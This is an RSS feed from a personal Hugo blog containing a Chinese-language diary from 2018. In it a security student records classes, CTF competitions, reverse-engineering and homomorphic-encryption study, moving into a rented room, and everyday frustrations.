<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>{Vorblock&gt;&gt;&gt;blog}</title>
    <link>https://naivete.cc/</link>
    <description>Recent content on {Vorblock&gt;&gt;&gt;blog}</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 06 Aug 2018 11:13:06 +0800</lastBuildDate>
    
        <atom:link href="https://naivete.cc/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>日记</title>
      <link>https://naivete.cc/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</link>
      <pubDate>Mon, 06 Aug 2018 11:13:06 +0800</pubDate>
      
      <guid>https://naivete.cc/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</guid>
      
        <description>

&lt;h2 id=&#34;乱七八糟的日记&#34;&gt;乱七八糟的日记&lt;/h2&gt;

&lt;h2 id=&#34;2018-11月&#34;&gt;2018-11月&lt;/h2&gt;

&lt;p&gt;日记写在博客还是麻烦、日记从此写在平时世界APP上。&lt;/p&gt;

&lt;h3 id=&#34;2018-11-03-08&#34;&gt;2018-11-03-08&lt;/h3&gt;

&lt;p&gt;部分日记用手机端的平行世界上去了，比较方便写&amp;hellip;&lt;/p&gt;

&lt;h3 id=&#34;2018-11-02-星期五&#34;&gt;2018-11-02 星期五&lt;/h3&gt;

&lt;p&gt;没课，&lt;/p&gt;

&lt;h3 id=&#34;2018-11-01-星期四&#34;&gt;2018-11-01 星期四&lt;/h3&gt;

&lt;p&gt;写各种实验报告。&lt;/p&gt;

&lt;h2 id=&#34;2018-10月&#34;&gt;2018-10月&lt;/h2&gt;

&lt;h3 id=&#34;2018-10-29-31&#34;&gt;2018-10-29-31&lt;/h3&gt;

&lt;p&gt;这个月结束了。。。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-22-28-6天&#34;&gt;2018-10-22-28 6天&lt;/h3&gt;

&lt;p&gt;这段时间不知道做了些什么，补了些乱七八糟的东西。打了一些乱七八糟的CTF。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-21-星期天&#34;&gt;2018-10-21 星期天&lt;/h3&gt;

&lt;p&gt;今天决定就把云计算的团队退了，以后就安心学移动安全和看一些IoT吧。补知识ing。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-18-20&#34;&gt;2018-10-18-20&lt;/h3&gt;

&lt;p&gt;咸鱼的生活，第八周了很多课要做大作业，还得赶。。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-17-星期三&#34;&gt;2018-10-17 星期三&lt;/h3&gt;

&lt;p&gt;雾霾w(ﾟДﾟ)w。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-15-16&#34;&gt;2018-10-15-16&lt;/h3&gt;

&lt;p&gt;课比较多的两天。花时间调库，补C++ing。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-14-星期天&#34;&gt;2018-10-14 星期天&lt;/h3&gt;

&lt;p&gt;昨晚又通宵了。早上起床困难。今天为了出题，试了一波音频隐写，jpg隐写，又配了一下抓包的环境。出了一道很简单的题。没达到想要的效果。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-13-星期六&#34;&gt;2018-10-13 星期六&lt;/h3&gt;

&lt;p&gt;终于周末了，护网杯打开-&amp;gt;护网杯结束。 电影院看了《无双》。over。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-10-12&#34;&gt;2018-10-10 - 12&lt;/h3&gt;

&lt;p&gt;赶作业+屁事不断。Helib库基本搞懂了，对二级制的加减乘除也基本搞懂了，会弄half adder -&amp;gt; full adder了。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-09-星期二&#34;&gt;2018-10-09 星期二&lt;/h3&gt;

&lt;p&gt;满课的一天，还要忙奖学金的事情。今天可以说是最烦的一天。做不完的事情，空闲时间都不知道用来干嘛了。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-08-星期一&#34;&gt;2018-10-08 星期一&lt;/h3&gt;

&lt;p&gt;上课生涯又开始了。早起的开始。无聊啊，这些课都没啥意义，像小白鼠一样的拿来做实验似的。&lt;/p&gt;

&lt;p&gt;招新赛开始，题目还没出完，学了新的东西，忘记了旧的知识。。只打算出两道Android的。&lt;/p&gt;

&lt;h3 id=&#34;2018-10-01-07&#34;&gt;2018-10-01 - 07&lt;/h3&gt;

&lt;p&gt;国庆7天，日记写在了：&lt;a href=&#34;https://naivete.cc/post/%E6%AD%BB%E8%82%A5%E5%AE%85%E7%9A%84%E5%9B%BD%E5%BA%86%E8%8A%82/&#34;&gt;死肥宅的国庆节&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;2018-9月&#34;&gt;2018-9月&lt;/h2&gt;

&lt;h3 id=&#34;2018-09-30-星期天&#34;&gt;2018-09-30 星期天&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;明天就是国庆节啦，提前祝节日快乐。不回家的我看来要宅个6天左右。。&lt;/li&gt;
&lt;li&gt;今天上了安全编程课，发现连基本的C++的忘记的差不多了，看来国庆得补补，而且同态加密论文的算法也应该用c++来实现，难度瞬间上升。正好国庆放假，每天稍微补一点知识吧。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-29-星期六&#34;&gt;2018-09-29 星期六&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;从国庆开始，主要更新学习方面的东西，不再说那么多废话。&lt;/li&gt;
&lt;li&gt;今天除了上课的内容以外，在Twitter看到#flareon5,打算刷一下，卡在了第二关，真的菜，主要是一点都没接过.net的知识，还得补一些基础知识。才能看懂。主要看了两个工具一个&lt;a href=&#34;https://github.com/0xd4d/dnSpy&#34;&gt;dnSpy&lt;/a&gt;、一个&lt;a href=&#34;https://github.com/icsharpcode/ILSpy&#34;&gt;ILSpy&lt;/a&gt;用来反汇编.net的程序。&lt;/li&gt;
&lt;li&gt;任务的论文是真的难看懂，同态加密的知识还得补补。之前上课讲的已经忘记得差不多了。C++开发的知识也得补补。也是忘记得差不多了。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-28-星期五&#34;&gt;2018-09-28 星期五&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;只有早上一节课，真舒服。&lt;/li&gt;
&lt;li&gt;整个剩下的上午以及下午都在看同态加密相关的内容。主要看了和配置两个库HElib和Seal。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-27-星期四&#34;&gt;2018-09-27 星期四&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;好烦啊，事情真多，都快一个月，还是没得闲。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-26-星期三&#34;&gt;2018-09-26 星期三&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;哈哈哈。不能熬夜了，身体扛不住。睡早点睡早点。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-25-星期二&#34;&gt;2018-09-25 星期二&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;满课的一天，毛概真的是够了，无聊到死。还早上第一节课，又困又无聊。真的是浪费时间，要不是听说要闭卷，不然是不可能听一丢丢这种模因污染。&lt;/li&gt;
&lt;li&gt;可能是还没回过神来，困，早上困，中午困，下午还是困，直接下午饭都懒得吃了，直接睡一觉。&lt;/li&gt;
&lt;li&gt;晚上继续看云计算的东西。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-24-星期一&#34;&gt;2018-09-24 星期一&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;中秋假期的最后一天，天气阴。起床玩手机赖床，早上过去了，中午约了饭，出发，排队。一排就是到1点多了，自助牛排，牛排差评，其他味道还不错。只有在电科了逛了逛，心累啊，看到了电科的招聘宣传。差别挺大的。。&lt;/li&gt;
&lt;li&gt;骑车回到学校都已经差不多6点了，无心学习啊。有点迷茫，思考考验与否的问题，和高中同学讨论了一下，还是有要考研的。。&lt;/li&gt;
&lt;li&gt;始终还是看一一些可信云计算的基础知识，还是没怎么参透。先慢慢研究吧，时间也不多了。好好思考下未来吧。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-23-星期天&#34;&gt;2018-09-23 星期天&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;还以为今天是星期六，好像完全忘记了昨天发生了什么事。&lt;/li&gt;
&lt;li&gt;昨晚熬了一下，早上反而起到要早。但是没什么精神。中午很困，昨天还是大太阳的，今天就大雨了，成都这是什么鬼天气。&lt;/li&gt;
&lt;li&gt;今天只看了一下逆向的东西。写了个计划，应该从下周开始执行。ヾ(◍°∇°◍)ﾉﾞ。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-22-星期六&#34;&gt;2018-09-22 星期六&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;睡了个懒觉。&lt;/li&gt;
&lt;li&gt;起床发现今天有安恒杯。菜鸡努力了几个小时放弃了。&lt;/li&gt;
&lt;li&gt;休闲的一天过去了。（陷入深深的沉思，今天到底干了嘛。今天唯一高兴的可能是老爸突然发了个200的红包过来祝我中秋节快乐！）&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-21-星期五&#34;&gt;2018-09-21 星期五&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上唯一一节课，就开始放中秋节的假了。本来有班会的，直接溜了。踏上去欢乐谷之路。星期五去真是太好了，所有项目都不用排队，好爽，一来就5个过上车轮流玩了一遍。差不多玩到6点半才回去。好累，要吐槽的是过山车座位的机油全部抹到我的白色衣服上了，好糟心。&lt;/li&gt;
&lt;li&gt;面试了蒋林智博士的团队。可信云计算这东西以前完全没接触过。。现在想让我转方向，其实我是拒绝的。一切都是兴趣问题，不知道要是没有了兴趣，还能不能学起来。&lt;/li&gt;
&lt;li&gt;通过一天的挣扎，学校终于可以加分了。还是想骂一句：计算机学院那些傻x领导。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-20-星期四&#34;&gt;2018-09-20 星期四&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;垃圾学校，傻x计算机学院领导。&lt;/li&gt;
&lt;li&gt;买了明天欢乐谷门票，就当是去散散心吧。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-19-星期三&#34;&gt;2018-09-19 星期三&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上的课总算是不无聊的课了。又到了这个学期评绩点的时候了，今年水了挺多比赛，水了几个奖，应该能加点绩点混混奖学金。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-18-星期二&#34;&gt;2018-09-18 星期二&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;又是早起的一天，看天气应该不会下雨，但是出去之后发现还是在下缥缈的小雨，今天一整天都是满满的课。&lt;/li&gt;
&lt;li&gt;闲暇时间刷了下微博，知乎，突然感觉好丧啊，社会都已经这样，还是提不起精气神来。看来晚上得早点睡觉。&lt;/li&gt;
&lt;li&gt;Win10 阅览版BUG绿屏导致我写这篇日记的时候中断，又是没保存，又得重新写一遍。最近都绿屏差不多5-6次了，这到底是什么BUG。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-17-星期一&#34;&gt;2018-09-17 星期一&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;成都这天气，晚上还挺冷，中午出太阳有挺热的。今天进行了电疗的最后一次（感觉小姐姐医生完全按摩不如胡叔叔医生按摩的舒服，可能是因为小姐姐说的最近手得了腱鞘炎的原因吧。看来医生是真的辛苦，每次10点多一点去，都是人满满的，11:40下班的，但是每次我做完治疗都已经12多了，而且还有人）。&lt;/li&gt;
&lt;li&gt;下午又是水课，真的完全不想上啊，课程重复重复的讲。一点意思都没有。。&lt;/li&gt;
&lt;li&gt;一整天都困得要死，可能是晚上作息不太好，中午做了治疗导致午觉不能好好的睡，下午以及晚上上课都在打瞌睡。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-16-星期天&#34;&gt;2018-09-16 星期天&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天台风“山竹”广东登录，成都已经连续半个月没出太阳了，但是今天成都竟然出太阳了。得益于昨天的1000m,今天大腿实在是酸爽。&lt;/li&gt;
&lt;li&gt;试着刷刷了几道CTF的题，调了半天，还是有点迷茫，看了一下wp，发现byte.toString()得不到结果，而new String() 能得到结果，看来是java没学好，找时间再补补。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-15-星期六&#34;&gt;2018-09-15 星期六&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;下午体测ing。1000m 累死呀。今天可以说是什么都没做，早上起来去了一趟沃尔玛采购，下午去了体测，3点到的运动场，将近5点半才开始测，好浪费时间呀。&lt;/li&gt;
&lt;li&gt;晚上宿舍煮火锅，跑完1000m去沃尔玛买菜，好累，我只想好好休息一下。&lt;/li&gt;
&lt;li&gt;反思一下，假期不知不觉就过去了，也忘记了学到些啥。开学了两周了，除了上课，其他时间也不知道做了些啥。真的是有点迷茫呀。还有一只在纠结考研与否的问题。不知道毕业能不能拿到个像样的offer。还有下定决心好好学习英语的事也经常忘掉。该如何改正坏习惯呢？（B乎有各种各样的方法。。说到底还是要靠坚持。）&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-14-星期五&#34;&gt;2018-09-14 星期五&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;没早起，困。。早上只有一节课就放假了。下午得准备晚上招新宣讲的内容。。&lt;/li&gt;
&lt;li&gt;中午到下午写完的简单的app，睡觉睡了1个多小时。。&lt;/li&gt;
&lt;li&gt;宣讲会自己讲了些什么都不知道。懵逼。场下也全场懵逼。&lt;/li&gt;
&lt;li&gt;回到屋里，竟然没网了。。。更重要的是垃圾联通也没网，手机信号这么差。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-13-星期四&#34;&gt;2018-09-13 星期四&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上全部都是无聊的课。上课看了下android逆向的知识。最后一节逃了，直接去医院电疗。。&lt;/li&gt;
&lt;li&gt;下午毛概更是无聊、非常无聊。(_ _)( - . - )(~O~)……( - . - )&lt;/li&gt;
&lt;li&gt;晚上继续补知识。。回去的有点早，拿个快递。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-12-星期三&#34;&gt;2018-09-12 星期三&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;忽然发现《C与C++安全编码》这书还真不错，早上上课一直没听，一直看这本书（教材）。学漏洞利用的很多基础知识都有讲。&lt;/li&gt;
&lt;li&gt;中午又去针灸了、电疗，听起来很刺激，昨晚没睡饱，今天头晕晕的。。剩下的时间又开始满课。&lt;/li&gt;
&lt;li&gt;仔细学了一下dlmalloc，感觉还是有点一知半解。dlmalloc就是一种内存分配器，由Doug Lea在1987年开发完成，这是Android系统中使用的内存分配器。而Linux系统中采用的是ptmalloc，ptmalloc在dlmalloc的基础上进行了改进，以更好适应多线程。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-11-星期二&#34;&gt;2018-09-11 星期二&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;充实的一天，满课ing。放一张这学期的课表。还差数据结构实训以及数据库实训课没有排上。（星期二充实）&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/%E8%AF%BE%E7%A8%8B%E8%A1%A8.png&#34; alt=&#34;课程表&#34; /&gt;&lt;/li&gt;
&lt;li&gt;继续看了UAF，明天试试刷两道CTF的UAF试试。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-10-星期一&#34;&gt;2018-09-10 星期一&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早起去校医院的计划凉凉（起晚了一个小时，可能昨晚玩太晚）。10点校医院，检查+治疗完都12点半了，伞也忘记在hello单车上了，我的99的伞呀，心凉。今天教师节祝老师们节日快乐吧。&lt;/li&gt;
&lt;li&gt;下午开始就是满课了。都是些好无聊的课，说真完全不想去上。晚上的操作系统还是得好好听课，但是感觉开飞机一样的上课速度。&lt;/li&gt;
&lt;li&gt;早上昨晚针灸，一整天脖子都是酸痛的，都不敢趴下睡觉。&lt;img src=&#34;D:Project_ALLnaivete.cccontentassets09E4A58B.png&#34; alt=&#34;img&#34; /&gt;&lt;/li&gt;
&lt;li&gt;今天还是继续看昨天的UAF的基础吧。尽量在今天明天之内看完。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-09&#34;&gt;2018-09-09&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;一直下雨好冷啊，又赖床起晚了，窗子也没关，被子还是夏被，才买没多久，又得买冬被了。瑟瑟发抖！1000m是测不成了。起床洗了个澡去实验室了。小拇指发麻的症状还是没有解除，打算还是去校医院治疗吧。&lt;/li&gt;
&lt;li&gt;这都一个星期了 ，感觉过的有点浑浑噩噩的。很多之前打算的事情都没做完。这周打算认真看完的UAF都没看完，看来下周必须看完了。浏览器上一直挂着那几个页面。&lt;/li&gt;
&lt;li&gt;实验室又马上招新了，晚上开了下会，好无聊。下周宣讲会就随便讲点吧。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-08&#34;&gt;2018-09-08&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;第一周星期六，体侧，恐怖，可能第二天要腰酸背痛。早上睡了个懒觉，起来又好无聊。&lt;/li&gt;
&lt;li&gt;中午玩了下MC，等待下午的体测，还差一个1000m没测，留到明天了。总比一次测完的号，那要累死。晚上实验室聚会吃饭。。&lt;/li&gt;
&lt;li&gt;好累好累。感觉体测要没有70分了。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-07&#34;&gt;2018-09-07&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天早上上完安全编程课就放假了，ヾ(@^▽^@)ノ。还是没习惯每天早起，早上还是要懒床（这不行呀）。&lt;/li&gt;
&lt;li&gt;今天学了什么呢？好像啥也没做。晚上又把以前的MC服务器开了起来，和实验室的小伙伴玩了几个小时。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-06&#34;&gt;2018-09-06&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天好像太阳都没出，秋天突然就来了。。新生报到，人山人海+车展似的。。。&lt;/li&gt;
&lt;li&gt;整天课都是挺多的，原本打算这学期能学更多东西的，估计要是没戏了，加油吧！&lt;/li&gt;
&lt;li&gt;好久没有晚上睡觉裹被子了。这天气真的是变化无常。&lt;/li&gt;
&lt;li&gt;再这样下去怕是要抑郁了啊啊啊。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-05&#34;&gt;2018-09-05&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;不知不觉星期三了，好快，这两天开学，感觉浑浑噩噩的过日子。&lt;/li&gt;
&lt;li&gt;感觉有的课好水，完全不像听啊，但是又怕期末挂科。。&lt;/li&gt;
&lt;li&gt;早上被毛概老师骗了，总共淋了三场雨，衣服又脏了，鞋子也进水了。难过(ಥ﹏ಥ)。&lt;/li&gt;
&lt;li&gt;上课好无聊，不上课有无所事事，这是怎么了。。下午去校医院医保报销医疗费，给我打了个6折。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-03-04&#34;&gt;2018-09-03-04&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;开学前两天，提前适应早起，也避免太晚睡觉，但是有点不好控制。&lt;/li&gt;
&lt;li&gt;成都的天气还是反复无常，莫名其妙下雨，还是热得不行。&lt;/li&gt;
&lt;li&gt;汇编老师好好玩。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-02&#34;&gt;2018-09-02&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;老早就醒了，明天就要开学了，睡不着呀。&lt;/li&gt;
&lt;li&gt;下午师傅来修门，加上拿快递，又浪费了一个下午的时间。。&lt;/li&gt;
&lt;li&gt;晚上开了班会，依然很无聊。搬桌子，学校把教室公寓分给学生住这个骚操作。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-09-01&#34;&gt;2018-09-01&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;看了一早上的博客，好无聊呀。。。&lt;/li&gt;
&lt;li&gt;下午去拿书啊。。后天就正式开学了，好快呀。。&lt;/li&gt;
&lt;li&gt;晚上去看了碟中谍6，好看，阿汤哥还是那么厉害。。给个5星好评吧，两个半小时真的不错。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-31&#34;&gt;2018-08-31&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;看了一篇论文。要开学了，许多事情还没忙完，继续弄吧。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-30&#34;&gt;2018-08-30&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;隔壁的女同学搬走了，(⊙o⊙)… 我发现她住的那个房间有个大阳台比较舒服，所有和房东商量了一下，决定帮到她那间去住，舒服。。。&lt;/li&gt;
&lt;li&gt;下午又有人看房，最后一个隔壁校的女生租了下来。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-29&#34;&gt;2018-08-29&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;搬了一个早上的东西，好累、又累又饿啊啊啊啊啊啊。。。&lt;/li&gt;
&lt;li&gt;中午改了一下网站，下午干活吧。&lt;/li&gt;
&lt;li&gt;晚上回去又折腾了半天房间。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-27-28&#34;&gt;2018-08-27-28&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;27号租了个房，东西都没搬，实在不想住宿舍了，接下来就是好好努力赚房租吧。。下定决心的事绝对不能反悔。给自己加个油👍&lt;/li&gt;
&lt;li&gt;逛推特找文章看，努力翻译了一篇，发现内容没有想象中那么好，还是想想怎么写原创的文章或者考虑下如何出题的问题吧。&lt;/li&gt;
&lt;li&gt;这两天全部在忙找房租房的事，啥也没学。。还有4天就要开学了，干巴得。。。&lt;/li&gt;
&lt;li&gt;今天（28）上午准备了下学期实验室招新要用的比赛平台，好像上学期也是我弄得、以前的备份还在，不过已经一年了，CTFd也更新很多新的内容，整个上午都在重新搭建，自从有了Docker以后发现挺多事情都好解决了挺多。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-26&#34;&gt;2018-08-26&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天看了一下租房的事，两年下来，其实住宿舍也没有什么，就是环境差了一点。室友都挺好的，然而可以说是学习环境恶劣，发现回去宿舍了之后根本不会想着去学习的事情，只会想着如何玩，也不会带电脑去宿舍，想了想，既然这样，还不如自己赚点钱出去租个房子住，住宿舍根本无法学习，当然如果环境能再好一些的话，说不定会认真学习呢。&lt;/li&gt;
&lt;li&gt;既然这样，就先搬出去住看看，如果能换到苑去住的话，就换苑，把房退了，不行的吧，就一直租房住吧。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-25&#34;&gt;2018-08-25&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上来到实验室发现有安恒杯。&lt;/li&gt;
&lt;li&gt;打了一整天安恒，所谓的应急响应全是流量分析。。。第一题是真的坑，看到了痕迹，试试n个名字还是不对，看了WP还真是那个，好冤，还是第11和第3题答案一样，本来看到包里的答案了，但是base64出不来答案（巨坑）。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-24&#34;&gt;2018-08-24&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;大早上被热醒了，空调又是半夜没电。直接去实验室继续看OLLVM的反混淆，看到了符号执行来去混淆。&lt;/li&gt;
&lt;li&gt;算了这个OLLVM,弄了半天各种环境报错，心态炸了，整理整理改天发博客。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-23&#34;&gt;2018-08-23&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;刚OLLVM。&lt;/li&gt;
&lt;li&gt;下午去游泳，好累，左手好痛。&lt;/li&gt;
&lt;li&gt;晚上又试了一下真机调试OLLVM的混淆，DDMS还是无法显示进程信息，有毒啊，百度google了半天，还是没有解决这个问题。之前还还好好的，突然就无法显示了。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-22&#34;&gt;2018-08-22&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;英语又没过，过是不可能过的了，这辈子都不可能过的啦。(；′⌒`)&lt;/li&gt;
&lt;li&gt;发泄了一下，中午以及下午打游戏。。又把OLLVM抛在脑后了。ε(┬┬﹏┬┬)3&lt;/li&gt;
&lt;li&gt;晚上才回想起OLLVM这件事。。继续刚吧。吐槽一下学校脑残的门禁机制，本来说好的晚上9点半锁门，然而10点半都不一定锁，回去晚了怕被锁在外面，早早回宿舍又不知道干嘛，环境又差又没有网。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-21&#34;&gt;2018-08-21&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上看了下Twitter以及一些博客。。&lt;/li&gt;
&lt;li&gt;中午吃饭打游戏。。棒棒鸡真好吃。&lt;/li&gt;
&lt;li&gt;下去看看昨天的题，第一次听说D语言（昨天的第二道逆向题）。学长大佬说MBR那是个原题（膜）看来是我见的太少。。&lt;/li&gt;
&lt;li&gt;看了一下OLLVM混淆。晚上时间不够了，打算明天来弄吧&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-20&#34;&gt;2018-08-20&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;9点醒，9:30起床，10点到实验室。&lt;/li&gt;
&lt;li&gt;然后就开始了网鼎杯&lt;/li&gt;
&lt;li&gt;5点结束，说说收获吧，主要看了逆向题以及一道杂项，逆向做出一题，第二题完全看不懂内容，有点像混淆，第二道题是MBR 的逆向，google了很多资料之后，对这个有了稍微的认识。下午许多时间都在死磕这道题，还是没做出来。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-19&#34;&gt;2018-08-19&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天起得还算早一些。早上到实验室把昨晚剩下的那道CTF题目补了。。&lt;/li&gt;
&lt;li&gt;早上休息，打打游戏，不能浪费充的点卡，怎么说也要把点卡用完。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-18&#34;&gt;2018-08-18&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;身份证上过生日&amp;hellip;&lt;/li&gt;
&lt;li&gt;玩了下《古剑奇谭OL》,还冲了点卡。。。垃圾游戏毁我青春。。&lt;/li&gt;
&lt;li&gt;晚上发现I春秋的CTF课在手机上可以免费看，但是电脑上上要收费🌓,打算免费刷一波。&lt;/li&gt;
&lt;li&gt;看完了学二进制学习指南，感觉要补的知识还是挺多，编译原理一点都没看，抽时间补补。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-17&#34;&gt;2018-08-17&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;七夕好像和自己没什么关系，吃个饭到实验室继续。。&lt;/li&gt;
&lt;li&gt;下去去换个了手机屏幕，去了趟春熙路，一个下午就没了。。&lt;/li&gt;
&lt;li&gt;白天买的电动牙刷刷头忘记在滴滴单车上了，ε(┬┬﹏┬┬)3，浪费我65..&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-16&#34;&gt;2018-08-16&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;明天就是七夕了，现充什么的不存在的，单身狗死宅就应该好好呆在空调房里。大早上被室友的电话吵醒，空调半夜欠费，好热好热。。&lt;/li&gt;
&lt;li&gt;中午出去帮室友拿拿快递，早上天气挺凉爽的，骑个Hello甚是舒服。&lt;/li&gt;
&lt;li&gt;下午挺热的呀，5点打算去游泳。。没去。。&lt;/li&gt;
&lt;li&gt;晚上室友返校，终于不是自己一个人在宿舍了。睡了个好觉。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-15&#34;&gt;2018-08-15&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上醒得挺早，可惜赖床浪费了一个小时。翻了一下Twitter,看了一些BlackHat USA 2018的分析文章，感觉内容挺深，也有可能是全英文看得有点懵，看不懂。。&lt;/li&gt;
&lt;li&gt;下午继续看书，把以前的知识补一下。。&lt;/li&gt;
&lt;li&gt;晚上洗个澡好麻烦，要跑这么远。回到宿舍一个人又是好无聊，又没电脑，只有拿手机打打游戏吧！&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-14&#34;&gt;2018-08-14&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;依旧睡死，起床看见短信昨天下午京东买的满减书（300-150-20）到了，出去吃个饭顺便把书拿了。买了4本书，《最强Android书：构架大剖析》、《ios应用逆向与安全》、《软件定义安全及可编程对抗系统实战》、《鬼刀 WLOP个人插画作品集》，前两本感觉还不错，Android的那本买到了有瑕疵的（o(╥﹏╥)o）。第三本感觉不好，留着随便看看然后吃灰（估计）。第四本很喜欢(〃&amp;rsquo;▽&amp;rsquo;〃)，画风真不错。&lt;/li&gt;
&lt;li&gt;下午一直看书，动手实践、以后要一直多尝试动手操作，光看理论好枯燥。能看懂的比以前多了，小开心。。&lt;/li&gt;
